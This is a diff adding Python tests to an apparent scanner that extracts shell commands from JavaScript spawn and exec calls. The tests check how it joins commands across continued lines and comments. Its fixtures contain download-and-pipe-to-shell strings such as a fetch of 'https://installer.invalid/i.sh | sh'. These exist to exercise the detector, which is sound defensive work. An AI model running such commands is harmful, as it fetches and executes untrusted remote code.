@@ -84,6 +84,75 @@ class TestTheCallsOwnArguments:
         assert [c.text for c in found] == ["ls"]
 
 
+class TestANameIsReadAsItsOwnStatement:
+    """The command a spawn is handed by name is what was assigned to that name, up to the end of that statement and the
+    statements that add to it -- not every string literal in the next 2,048 characters. A launcher's help text, defined near
+    the spawn, was joined into its command and read as `curl ... | sh` (a dev-half MCP server's launcher)."""
+
+    FETCH_PIPE = FETCH + "-fsSL https://installer.invalid/i.sh | sh"
+
+    def commands(self, source: str) -> list[str]:
+        return [c.text for c in embedded.EmbeddedCommands.extract(source, "javascript")]
+
+    def test_a_message_defined_after_the_assignment_is_not_the_command(self) -> None:
+        found = self.commands(
+            'const runner = "uvx";\n'
+            f'const advice = "To install the runner: {self.FETCH_PIPE}";\n'
+            'const child = spawn(runner, ["serve"], { stdio: "inherit" });\n'
+        )
+        assert found == ["uvx serve"]
+
+    def test_a_message_without_semicolons_is_not_the_command(self) -> None:
+        found = self.commands(
+            'const runner = "uvx"\n'
+            f'const advice = "To install the runner: {self.FETCH_PIPE}"\n'
+            'const child = spawn(runner, ["serve"])\n'
+        )
+        assert found == ["uvx serve"]
+
+    def test_a_command_continued_on_the_next_line_by_an_operator_is_whole(self) -> None:
+        for source in (
+            f'const command = "{FETCH}-s {DESTINATION}" +\n  " | sh";\nexec(command, done);\n',
+            f'const command = "{FETCH}-s {DESTINATION}"\n  + " | sh";\nexec(command, done);\n',
+            f'const command = cond\n  ? "{FETCH}-s {DESTINATION} | sh"\n  : "true";\nexec(command, done);\n',
+        ):
+            assert "| sh" in " ".join(self.commands(source)), source
+
+    def test_a_template_literal_with_a_semicolon_is_whole(self) -> None:
+        found = self.commands(
+            f"const command = `{FETCH}-s {DESTINATION}; echo | sh`;\nexec(command, done);\n"
+        )
+        assert "| sh" in " ".join(found)
+
+    def test_a_later_statement_appending_to_the_name_is_part_of_it(self) -> None:
+        for source in (
+            f'let command = "{FETCH}-s {DESTINATION}";\ncommand += " | sh";\nexec(command, done);\n',
+            f'let command = "{FETCH}-s {DESTINATION}";\ncommand = command + " | sh";\nexec(command, done);\n',
+            f'let command = "{FETCH}-s {DESTINATION}";\nlog("x");\ncommand += " | sh";\nexec(command, done);\n',
+        ):
+            assert "| sh" in " ".join(self.commands(source)), source
+
+    def test_a_comment_after_the_assignment_is_not_part_of_it(self) -> None:
+        found = self.commands(
+            'const runner = "uvx" // don\'t install with ' + FETCH + "x | sh\n"
+            "// and a line: it's " + self.FETCH_PIPE + "\n"
+            'const child = spawn(runner, ["serve"])\n'
+        )
+        assert found == ["uvx serve"]
+
+    def test_a_comment_between_the_lines_of_a_continued_command_is_skipped(self) -> None:
+        found = self.commands(
+            f'const command = "{FETCH}-s {DESTINATION}" +\n  // the tail\n  " | sh";\nexec(command, done);\n'
+        )
+        assert "| sh" in " ".join(found)
+
+    def test_an_unrelated_statement_between_is_not(self) -> None:
+        found = self.commands(
+            f'let command = "ls";\nconst note = "{self.FETCH_PIPE}";\nexec(command, done);\n'
+        )
+        assert found == ["ls"]
+
+
 class TestLanguageGating:
     def test_a_language_that_does_not_spawn_this_way_yields_nothing(self) -> None:
         """A rule pack, a lockfile or a document may all contain the text of a
